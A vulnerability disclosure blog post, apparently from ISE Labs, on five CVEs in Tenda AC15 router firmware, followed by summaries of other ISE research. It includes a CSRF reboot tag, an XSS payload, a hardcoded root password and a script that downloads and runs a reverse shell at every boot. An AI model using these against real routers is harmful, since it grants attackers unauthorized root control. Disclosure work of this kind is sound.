Tenda AC15 AC1900

As part of ISE Labs’ research into embedded devices, we looked at Tenda’s AC15 AC1900 Smart Dual-band Gigabit Wi-Fi Router. During our research efforts, we tested the router running its then-latest firmware version 15.03.05.19. While they have recently removed this version from official circulation, we would like to mention that Tenda has not updated their firmware since 2017. However, the 2019 firmware version is still available to download from Tenda’s US website.

Our research efforts uncovered 5 CVEs with concerning ramifications for the firmware running on the Tenda AC15 AC1900. Interesting stuff right? Continue reading as we will demonstrate two methods attackers can use to gain persistent unauthenticated root access to the device. It is worth mentioning that the exploitation of these vulnerabilities can be leveraged as part of a botnet to potentially attack external systems and other systems residing on the internal network.

# **Setting the Stage**

The admin account of the router is initially set up with the password as `mouse`. The MD5 hash of `mouse` (`40203abe6e81ed98cbc97cdd6ec4f144`) will show up throughout this blog. Now that we can successfully authenticate to the router’s web interface, let’s get started by searching for web-based vulnerabilities that can be leveraged to gain access to or potentially compromise this device. We’ll proceed to map the application’s various endpoints while taking note of any potential entry points for injection, such as client-controlled parameter fields. After this, we will use binwalk to extract the binary files from the firmware and [IDA Pro](https://www.hex-rays.com/products/ida/) to disassemble and analyze them.

## Initial Reconnaissance

We will first begin our analysis phase of the AC1900 with port and service enumeration using [Network Mapper](https://nmap.org/) (Nmap) to determine how the router is configured. As we want Nmap to scan all TCP ports (from 1 to 65535), determine services, versions and the OS being used (A) and provide verbose output(v) we will run `nmap -p 1–65535 -T4 -A -v 192.168.0.1`, which gives us the following list of open ports.

```
PORT       STATE      SERVICE      VERSION
23         open       telnet
telnetd
80         open       http         Tenda WAP http admin
1990       open       Stun-p1
5500       open       Rtsp
8180       open       http         nginx 1.22
9000       open       Cslistener
10004      open       emcrmirccd
```

Using these results, we know that the device is running RTSP, STUN, and two HTTP servers. While none of this out of the ordinary, the device also happens to be running a Busybox instance of telnetd. Hopefully, we will be able to use this to telnet into the device and get root privileges.

# **Exploiting Insufficient Request Validation (CVE-2020–10986)**

While exploring the various endpoints of the application using [Burp Suite](https://portswigger.net/burp), we came across the SysToolReboot endpoint, which disconnects the router from the Internet for approximately 45 seconds before rebooting. The web interface reboots the router using the following GET request which changes the state of the device.

![]()

Reboot GET Request

An attacker that can convince an authenticated victim to visit a malicious web page can exploit a cross-site request forgery (CSRF) attack. CSRF attacks force end-users to execute unwanted state-changing actions on web applications in which they are currently authenticated. For example, an attacker may use an HTML `<img>` tag to cause the state-changing GET request to be issued upon page load. For this case, let’s propose that an attacker disguises the exploit URL as a 0x0 fake image such as below. When an authenticated user navigates to the malicious page hosted by the attacker, the browser will issue a request to retrieve the “image”, but instead of actually retrieving the image, the issued request will cause the router to reboot.

```
<img src="http://192.168.0.1/goform/SysToolReboot" width="0" height="0" border="0">
```

An attacker can also social engineer an authenticated user to click on `http://192.168.0.1/goform/SysToolReboot` for a simpler method of achieving the same result, as the request to reboot the device expects a GET request.

# **Exploiting** Insufficient Data Validation and Sanitization **(CVE-2020–10989)**

After further probing, we ultimately reach the WiFi Settings endpoint where we discover that the user-controlled parameter field, *Wifi Name*, under Wifi Name & Password, is used in the landing page.

![]()

Web Interface Landing Page

On closer inspection, the application parses this parameter without input sanitization. We can exploit this by supplying a JavaScript payload (`<script>alert(document.cookie)</script>`) in the parameter to use a potential cross-site scripting attack. As shown below, when the victim navigates to the dashboard, it will cause the browser to execute the payload.

![]()

With that, we now have persistent XSS that is triggered every time an authenticated user encounters the Wifi Name on the web application. This, in combination with the previous CSRF attack, can be used to cause persistent denial of service. While this is a valid attack vector, it requires authentication and admin privileges, which involves more investment as an attacker than we would like. Since our goal should be to both minimize the amount of victim involvement and attacker privilege required, let us dig a little deeper through the actual firmware and continue our search for vulnerabilities.

# **Finding Hardcoded Credentials (CVE-2020–10988)**

As found in [CVE-2018–5770](https://www.cvedetails.com/cve/CVE-2018-5770/), an unauthenticated remote user can start a telnetd service on Tenda AC15 devices to get root access. However, in the most recent version of the firmware (v19), the hard-coded backdoor accounts no longer give access to root. Instead, the md5 hash of the password to get root access is hardcoded in the tenda\_login binary (`9B60FC59706134759DBCAEA58CAF9068`). This can be cracked to get “Fireitup”. The figures below show the location of the password and a sample telnet login.

![]()

Tenda\_login Binary File

![]()

Telnet Login

# **Finding Remote Code Execution (CVE-2020–10987 &** CVE-2020–15916**)**

While exploring the httpd binary file, we discovered that during request execution, the `deviceName` parameter and the `lanIp` parameter are passed directly to a `doSystemCmd` function, causing an arbitrary command execution.

![]()

formsetUsbUnload in httpd Binary file

![]()

TendaTelnet in httpd Binary File

The value of the `deviceName` parameter can be set through an authenticated request to the web interface such as below, for example, to force the router to reboot.

![]()

Code Execution Using the deviceName Parameter

The value of `lan.ip` can also be set via a similar request to the web interface (which is less useful), or set using `cfm` via the root shell obtained by starting the telnet daemon as mentioned above.

![]()

Setting lan.ip

This can be used for persistent attacks as the value of `lan.ip` does not change unless the router is factory reset, even after rebooting. Changing the value of `lan.ip` temporarily disables the WiFi and requires a reboot for normal functionality.

# **Further Exploitation**

Although the telnet daemon gives us root access to the router, we should be able to further exploit the vulnerabilities we have found so far to also start a persistent reverse shell on the device.

As the `busybox` instance on the router supports `wget`, we can download a reverse shell (in this case configured to connect to port 8213) to the `/tmp` folder. While executing this gives us root access, the file is deleted every time the router reboots. A better way of achieving persistence is by using the remote code execution in `lan.ip` to download and run the shell at the start of every boot. We do this by creating the following bash script (`sizzle`) which sets `lan.ip` accordingly and connects to our port. It is important to note that the commands in `lan.ip` are only executed on startup and not otherwise.

```
#! /bin/shcfm set lan.ip '192.168.0.1; cd tmp; wget http://192.168.0.112:8000/shell; chmod +x shell; ./shell'cd tmp;
wget http://192.168.0.112:8000/shell;
chmod +x shell;
./shell
```
![]()

Using ‘sizzle’ to Set lan.ip to Obtain a Reverse Shell at Port 8123

We can use Netcat (`nc`) to listen (`-l`) to port (`-p`) 8123 for incoming traffic and get the following response when we connect to the router.

![]()

Reverse Shell at Port 8123

# **Conclusion**

In this post, we have shown how to compromise and access this device without authentication and cause persistent denial of service condition. It is interesting to note that as Tenda has yet to patch these vulnerabilities, similar vulnerabilities may exist in other firmware versions. Attackers, consequently, can develop similar exploits that affect other Tenda embedded devices.

# Research

## [SOHOpelessly Broken 2.0](../casestudies/sohopelessly-broken-2-0/)

Internet of Things (IoT) devices have always been vulnerable to a variety of security
issues. In 2013, Independent Security Evaluators (ISE) performed research on IoT devices
that showed how rich feature sets could be leveraged to compromise devices. Today, we
show that security controls put in place by device manufacturers are insufficient
against attacks carried out by remote adversaries. This research project aimed to
uncover and leverage new techniques to circumvent these new security controls in
embedded devices.

## [Ethercombing: Finding Secrets in Popular Places](../casestudies/ethercombing/)

Blockchains are public ledgers of transactions verified through the use of public and
private keys to sign and prove ownership of transaction data. Popular blockchains have
hundreds of millions of transactions which include some of the most popular â Bitcoin,
Waves, Ripple, ZCash, Monero and Ethereum. Currently, on the Ethereum blockchain there
are 345 million transactions [1] across 47 million [2] key pairs. The chance
of generating a private key already used on the blockchain is around 1 in 2256 â all but
impossible.

## [Password Managers: Under the Hood of Secrets Management](../casestudies/password-manager-hacking/)

Password managers allow the storage and retrieval of sensitive information from an
encrypted database. Users rely on them to provide better security guarantees against
trivial exfiltration than alternative ways of storing passwords, such as an unsecured
flat text file. In this paper we propose security guarantees password managers should
offer and examine the underlying workings of five popular password managers targeting
the Windows 10 platform: 1Password 7 [1], 1Password 4 [1], Dashlane [2], KeePass [3],
and LastPass [4].

## [Securing Hospitals: A research study and blueprint](../research/hospitalhack/)

The research results from our assessment of 12 healthcare facilities, 2 healthcare data facilities,
2 active medical devices from one manufacturer, and 2 web applications that remote adversaries can
easily deploy attacks that target and compromise patient health. We demonstrated that a variety of
deadly remote attacks were possible within these facilities, of which four attack scenarios are
presented in this report. To understand these ecosystems, a two year study was performed from January,
2014 through January, 2016 of critical elements within these facilities as they relate to securing
patient health. Our goal was to create a blueprint --a step-by-step action plan-- that all medical
facilities can follow as the foundational element in reaching full security readiness. The research
was driven by a handson analysis of various healthcare systems, applications, and budgets, interviews
with hospital, data center, and medical device manufacturer employees, and sourcing industry knowledge
from thought leaders on our advisory board. The findings show an industry in turmoil: lack of executive
support, insufficient talent, improper implementations of technology, outdated understanding of
adversaries, lack of leadership, and a misguided reliance upon compliance.

ISE security researchers successfully discovered a vulnerability in the iPhone,
developed a toolchain for working with the iPhoneâs architecture (which also includes
some tools from the #iphone-dev community), and created a proof-of-concept exploit
capable of delivering files from the userâs iPhone to a remote attacker.

## [Exploiting Age of Conan & Anarchy Online](../casestudies/exploiting-age-of-conan-anarchy-online/)

Security researchers at Independent Security Evaluators uncovered two security
vulnerabilities present in the popular new and entertaining online game, Age of Conan,
produced by Funcom. These vulnerabilities allow an attacker to read arbitrary files off
of a victimâs computer, crash the games during online play, and in the case of Anarchy
Online, fully compromise a victimâs machine giving the attacker full control of the
targeted computer.

## [Exploiting SecondLife](../casestudies/exploiting-secondlife/)

ISE and outside researchers discovered an exploit for Second Life that grants control of
one character to a malicious character. This allows the adversary to perform actions
that may have real-world consequences such as stealing the in-game currency known as
Linden dollars, or controlling the playerâs machine.

## [Exploiting Android](../casestudies/exploiting-android/)

Analysts at ISE have identified and exploited a security vulnerability in the Android
operating system allowing a remote adversary to gain control on the device with the same
permissions as the web browser application. A successful attacker will have access to
information such as cookies used for accessing sites, information put into web
application form fields, and saved passwords, and can alter the way in which the browser
works, potentially tricking the user into entering sensitive information.

## [Industry-Wide Misunderstandings of HTTPS](../casestudies/industry-wide-misunderstandings-of-https/)

ISE identified 21 (70% of sites tested) financial, healthcare, insurance and utility
account sites that failed to forbid browsers from storing cached content on disk, and as
a result, after visiting these sites, unencrypted sensitive content is left behind on
end-usersâ machines.

## [Fighting Back Against SSL Inspection, or How SSL Should Work](../casestudies/fighting-back-against-ssl-inspection-or-how-ssl-should-work/)

ISE security analysts considered the increasing prevalence of SSL inspection on corporate
networks, threats to the certificate authority model that could allow SSL inspection to
spread to other types of networks in the future, and how built-in browser key generation
capabilities could be leveraged to achieve mutual authentication and greatly frustrate,
if not prevent, mass-scale, automated SSL inspection.

## [Exploiting SOHO Routers](../casestudies/exploiting-soho-routers/)

ISE researchers discovered critical security vulnerabilities in numerous small
office/home office (SOHO) routers and wireless access points. These vulnerabilities
allow a remote attacker to take full control of the routerâs configuration settings;
some allow a local attacker to bypass authentication directly and take control. This
control allows an attacker to intercept and modify network traffic as it enters and
leaves the network.

## Whitepapers

## [The Not-So-Same-Origin Policy: Bypassing Web Security through Server Misconfiguration](https://www.ise.io/wp-content/uploads/2018/03/ise_same-origin-policy_whitepaper.pdf)

The same-origin policy remains one of the most important security mechanisms
of the web, protecting servers against malicious pages interacting with
their APIs through cross-site requests. However, the subtle details of the
policy can be overlooked, so we aim to show how limitations in the
application of the same-origin policy can undermine security. We explain in
depth how the same-origin policy works and how some web technologies can
introduce loopholes that expose applications to cross-site attacks. Such
misconfigurations may exist in policies utilized by Java, Flash, and
Silverlight applications, and Cross-Origin Resource Sharing (CORS) headers
utilized by web applications.

## [From FAR and NEAR: Exploiting Overflows on Windows 3.x](https://www.ise.io/wp-content/uploads/2017/07/16buffer.pdf)

In a way, Windows 3.x provided Data Execution Prevention and a crude form of
Address Space Layout Randomizationâsecurity measures far beyond the
expectations of any early-1990s enterprise. The segmented memorymodel that
made 16-bit x86 code difficult to program also complicates building an
exploit. This paper demonstrates what may be the first public writeup of a
buffer overflow exploit targeting a Windows 3.x application, complete with
ROP chain and shellcode.

## [Demystifying Full-Disk Encryption](https://www.ise.io/wp-content/uploads/2017/07/fde_whitepaper_draft_20170627.pdf)

Transparent full-disk encryption uses techniques found almost nowhere else in
cryptography, such as ESSIV and XTS- AES. Why must designers resort to
building a custom cryptosystem rather than relying on standard techniques
with typical security guarantees? This paper explores the constraints under
which a full-disk encryption must operate, questioning the performance
reasons for avoiding more standard cryptography yet finding them to hold. I
introduce the reader familiar with cryptography but not the operation of
disks to this problem, explain the high-level workings of ESSIV and XTS-AES,
and review the attacks and limitations that these approaches face.

## [Reverse Engineering iOS Apps](https://www.ise.io/wp-content/uploads/2017/07/reverse_ios_apps.pdf)

Mobile applications are a part of nearly everyoneâs life, and most use
multiple mobile applications on a day-to-day basis. Mobile applications are
widespread and have a plethora of purposesâincluding, but not limited to,
banking and budgeting, social media, sending money, and playing games. With
all of these capabilities, one must ponder whether or not these applications
are securing sensitive user information at rest, as well as in transit.
While Apple provides an API for developers to secure data, developers may
not be utilizing these controls in a secure manner. This paper describes
common mistake security developers make, methods to test for those mistakes,
and problems encountered when testing for them. We will also explore reverse
engineering techniques to analyze iPhone operating system (iOS)
applications.

## [The Enemy You Know](https://www.ise.io/wp-content/uploads/2017/07/the_enemy_you_know.pdf)

Many organizations are already cognizant of the fact that there are security
threats originating from the inside, beginning with their own trusted
employees and partners. However, many organizations do not necessarily
differentiate between the various types of internal adversaries, and may
also be unaware that a uniform defense posture is not effective, as
different defense strategies are required to thwart each type of adversary.
This article will analyze the different types of internal threat actors,and
discuss how each is defended against. It will consider both technology and
psychology solutions, and aim to do so in a way that is immediately
actionable for organizations of all types.

## [Our Link-Clicking CSRF Victim Robot](../research/our-link-clicking-csrf-victim-robot/)

Over the past year, ISE has brought our SOHOpelessly Broken router hacking
contest to DEF CON, DerbyCon, Toorcon, and BSides DC. ISE started the
contest to shine light on the need for manufacturers to better secure small
office/home office (SOHO) devices; our thought was that by demonstrating the
vulnerabilities first-hand, we could help manufacturers recognize that SOHO
devices are highly vulnerable to malicious compromise, thus inspiring action
and change. Among the contestâs tracks is a live capture-the-flag
competition, in which contestants research known vulnerabilities and use
them to attack real routers running on a test network. Cross-site request
forgery (CSRF) is a common attack against the web interfaces of embedded
devices. CSRF occurs when an adversary tricks the victim into clicking a
link that leads to an attack page while simultaneously logged in to the
vulnerable device. The attack page generates and sends malicious HTTP
requests to the device, reconfiguring it without the victimâs knowledge or
authorization. For the contest to be successful, we needed to automate the
process of tricking a user into becoming a victim of a CSRF attack; the
result is our link-clicking CSRF victim robot. This white paper describes
the design and implementation of the resulting software.

## [Scanning IPS-Protected Networks with Nessus](../research/scanning-ips-protected/)

A Nessus vulnerability scan is one component of an overall network-level
security assessment. Frequently, networks are protected by an intrusion
prevention system (IPS). IPS rules may block traffic when throughput, packet
counts, or connection counts cross a predefined threshold, or when packets
are sent to blacklisted ports. Nessus provides neither a facility to
restrict the scan rate, nor any reliable method to restrict the TCP and UDP
ports to which it sends traffic. This paper describes the difficulties
encountered in controlling these aspects of Nessus scans and a workaround
ISE developed using virtualization, packet filters, and traffic control.

## [Industry-wide Misunderstandings of HTTPS](https://www.ise.io/wp-content/uploads/2017/07/caching.pdf)

Most web browsers, historically, were cautious about caching content
delivered over an HTTPS connection to diskâto a greater degree than required
by the HTTP standard. In recent years, in response to the increased use of
HTTPS for non-sensitive data, and the proliferation of bandwidth-hungry AJAX
and Web 2.0 sites, some browsers have been changed to strictly follow the
standard, and cache HTTPS content far more aggressively than before. HTTPS
web servers must explicitly include a response header to block
standards-compliant browsers from caching the response to diskâand not all
web developers have caught up to the new browser behavior. ISE identified 21
(70% of sites tested) financial, healthcare, insurance and utility account
sites that failed to forbid browsers from storing cached content on disk,
and as a result, after visiting these sites, unencrypted sensitive content
is left behind on end-usersâ machines.

## [Exploiting SOHO Routers](https://www.ise.io/wp-content/uploads/2017/07/soho_techreport.pdf)

Small office/home office (SOHO) routers are a staple networking appliance for
millions of consumers. They are often the single point of ingress and egress
from a SOHO network, manage domain name resolution, firewall protections,
dynamic addressing, wireless connectivity, and of course, routing. Their
heavy use in the consumer market and targeted demographic of non-computer
savvy users has not surprisingly led to very easy-to-use, nearly turnkey
solutions. As theyâve developed over the past decade, new and more features
have been added to these devices that make each router one step above its
previous iteration, and the competition â or so one would believe. Through
our research, we discovered 55 previously unpublished security
vulnerabilities in SOHO devices that demonstrate how the rich service and
feature sets (e.g., SMB, NetBIOS, HTTP(S), FTP, UPnP, Telnet, etc.)
implemented in these routers come at a significant cost to security. The
incorporation of additional services within these SOHO routers expose attack
surfaces that a malicious adversary can leverage to compromise the router
core, and gain a foothold in the victim network.

## [Perspective Matters](https://www.ise.io/wp-content/uploads/2017/07/Perspective-Matters-Whitepaper-12-2013.pdf)

To improve the security posture of digital systems, progressive organizations
engage third party security experts to assess risk and provide hardening
guidance. The most suitable approach for most industries is white box
vulnerability assessment. However, confusion about different security
approaches has led IT executives to commonly request the notably ineffective
approach of black box penetration testing. Most executives may be surprised
to discover that this approach actually undermines the very risk assessment
objectives they seek to achieve. This article will analyze trends, contrast
different tests and methodologies, and outline best practices; it has been
presented at a multiple of security conferences by Ted Harrington.

## [The Apple Sandbox](https://www.ise.io/wp-content/uploads/2017/07/apple-sandbox.pdf)

Despite the never ending proclamations of the end of memory corruption
vulnerabilities, modern software continues to fall to exploits taking
advantage of these bugs. Current operating systems incorporate a battery of
exploit mitigations making life significantly more complex for attackers
turning these bugs into attacks. Additionally, developers are becoming
increasingly aware of the security implications of previously idiomatic
code. Leading software publishers are teaching defensive coding techniques
and have adopted an offensive mindset for product testing. And yet, a single
vulnerability can still provide the attacker the leverage needed to gain
entry. Security researchers have disclosed multiple ways to render the
mitigations ineffective â imagine what techniques are not public.
Oftentimes, one bug can still âruin your dayâ.
